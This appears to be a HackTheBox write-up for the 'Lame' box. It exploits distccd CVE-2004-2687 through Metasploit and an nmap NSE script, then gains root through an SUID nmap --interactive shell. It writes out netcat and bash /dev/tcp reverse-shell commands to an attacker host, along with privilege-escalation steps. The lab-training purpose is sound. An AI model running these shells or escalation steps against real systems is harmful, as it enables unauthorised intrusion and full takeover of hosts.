Lame

Easy linux distccd cve-2004-2687 suid nmap

One of the oldest boxes on HackTheBox and still one of the best learning experiences. A misconfigured distccd daemon (CVE-2004-2687) accepts arbitrary command injection on port 3632, handing us a shell as daemon. From there, a world-visible SUID bit on nmap — combined with its built-in --interactive mode — drops us straight to root.

01 Reconnaissance

Kick off a full-range TCP scan with service detection and default scripts.

nmap -sC -sV -p- -T4 10.10.10.3 -oN nmap.txt
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4)

There are several known-vulnerable services here. The one we'll use:

  • distccd on 3632 — distccd v1 is vulnerable to CVE-2004-2687, which allows unauthenticated remote command execution. This is our foothold.
  • vsftpd 2.3.4 — famous smiley-face backdoor, but this specific HTB image doesn't carry the payload. The exploit will hang; skip it.
  • Samba 3.0.20 — also exploitable via CVE-2007-2447, but we're going through distccd today.

02 Service enumeration

Before exploiting, confirm the distccd service is actually accessible and responding. The Nmap NSE library ships a dedicated script for this:

nmap -p 3632 --script distcc-exec --script-args="distcc-exec.cmd='id'" 10.10.10.3
PORT     STATE SERVICE
3632/tcp open  distccd

Host script results:
| distcc-exec:
|   VULNERABLE (CVE-2004-2687)
|   Distributed Compiler Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs: CVE:CVE-2004-2687
|     Description:
|       Allows executing of arbitrary commands on systems running distccd 3.1
|       and earlier. The vulnerability is present when passwordless access is
|       enabled, which is the default configuration.
|
|     Output:
|       uid=1(daemon) gid=1(daemon) groups=65534(nogroup)

The NSE script both confirms the vuln and proves execution — we can already see the output of id running as daemon. Now we move to a real shell.

03 Identifying the vulnerability

CVE-2004-2687 affects distccd versions up to 3.1. The distccd daemon is designed to accept compilation jobs from remote hosts and execute them locally. With no authentication layer in the default configuration, an attacker can submit a fake "job" whose payload is an arbitrary shell command rather than source code. The daemon runs the command as whatever user launched it — in this case, daemon.

Why not Samba? CVE-2007-2447 against Samba 3.0.20 gives an instant root shell, which is actually worse for learning. The distccd path forces you to do a real privilege escalation step instead of getting root handed to you.

04 Exploitation — foothold as daemon

Path A — Metasploit

Metasploit ships a module for exactly this CVE:

msfconsole -q
use exploit/unix/misc/distcc_exec
set RHOSTS 10.10.10.3
set LHOST tun0
set PAYLOAD cmd/unix/reverse
run
[*] Started reverse TCP double handler on 10.10.X.X:4444
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo rXg...
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.X.X:4444 -> 10.10.10.3:52840)

daemon@lame:/tmp$

Path B — manual (no Metasploit)

The distccd protocol is simple enough to abuse with a Python one-liner. The classic approach wraps the command in a DIST protocol handshake using netcat or a small script. The cleanest manual path repurposes the same NSE script from enumeration, but this time points it at a reverse shell payload:

Start a listener on the attack box:

nc -lvnp 4444

Then fire the NSE script with a bash reverse shell as the command:

nmap -p 3632 10.10.10.3 --script distcc-exec \
  --script-args 'distcc-exec.cmd="nc 10.10.X.X 4444 -e /bin/bash"'

The listener receives a connection as daemon.

Gotcha: nc -e requires the BSD/traditional variant of netcat. On Lame this works because the image is Ubuntu 8.04. On newer targets, fall back to a bash TCP redirect: bash -i >& /dev/tcp/10.10.X.X/4444 0>&1.

05 Stabilizing the shell

The reverse shell is raw — no job control, no tab completion, Ctrl+C kills the session. Upgrade it before doing anything else:

python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z to background the shell
stty raw -echo; fg
# press Enter twice

Confirm context:

id
uid=1(daemon) gid=1(daemon) groups=65534(nogroup)

We're daemon, not root. Time to escalate.

06 Privilege escalation — nmap SUID

Standard first check after getting a foothold: look for SUID binaries.

find / -perm -u=s -type f 2>/dev/null
/usr/bin/nmap
/usr/bin/perl
/usr/bin/passwd
/usr/bin/sudoedit
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/sbin/uuidd
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/ping6
/bin/umount
/bin/fusermount
/bin/su
/bin/mount
/bin/ping

/usr/bin/nmap with SUID is the one that matters. Nmap versions 2.02 through 5.21 ship with an --interactive mode that drops into a sub-shell. Because this binary runs as root (SUID), that shell is a root shell.

Check the version to confirm:

nmap --version
Nmap version 4.53 ( http://insecure.org )

4.53 — well within the vulnerable range. Enter interactive mode:

nmap --interactive
Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap>

From the nmap prompt, spawn a shell:

nmap> !sh
sh-3.2# id
uid=0(root) gid=0(root)
Why does this work? ! in nmap's interactive mode passes the rest of the line to /bin/sh. Because the nmap binary has the SUID root bit set and is never dropped before spawning the shell, the resulting process inherits the effective UID of root.

07 Collecting the flags

Root shell in hand. Both flags are a short cat away:

cat /home/makis/user.txt
cat /root/root.txt
Note: the low-priv user on Lame is historically named makis. Run ls /home/ if the path doesn't exist — the name varies across box resets and reimages.

08 Takeaways

  • Read every port, not just the obvious ones. Port 3632 is easy to overlook next to Samba and FTP — but it's the one that matters here. Skimming the Nmap output would have sent you down the wrong path.
  • find / -perm -u=s is always step one for privesc. SUID binaries are low-hanging fruit and should be checked before anything else. GTFOBins has a full list of binaries that can be abused when SUID-flagged.
  • Understand the --interactive trick, don't just memorise it. The reason it works is SUID preserving the effective UID into child processes. Any binary that spawns a shell while SUID-rooted is the same class of vulnerability.
  • The unintended path (Samba) skips the privesc entirely. Choosing the harder foothold — distccd — forced a real privilege escalation exercise. That's the version worth practising for OSCP and real engagements.
